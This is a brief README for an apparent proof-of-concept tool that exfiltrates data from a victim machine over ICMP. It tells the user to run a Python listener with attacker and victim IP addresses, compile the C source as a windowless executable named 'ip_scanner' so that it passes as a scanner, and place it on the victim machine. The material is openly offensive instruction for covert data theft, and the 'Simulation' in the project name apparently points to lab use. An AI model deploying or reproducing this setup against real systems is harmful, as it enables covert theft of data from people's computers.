# ICSDSimulation-POC
ICMP Exfiltration without creating any files or processes
**Change the IP Address in the icmp_exfil.c before compiling**
##Listener
python2 listener.py source_ip victim_ip

##Victim
First compile
gcc icmp_exfil.c -o ip_scanner -mwindows
Then throw the exe on the victim machine
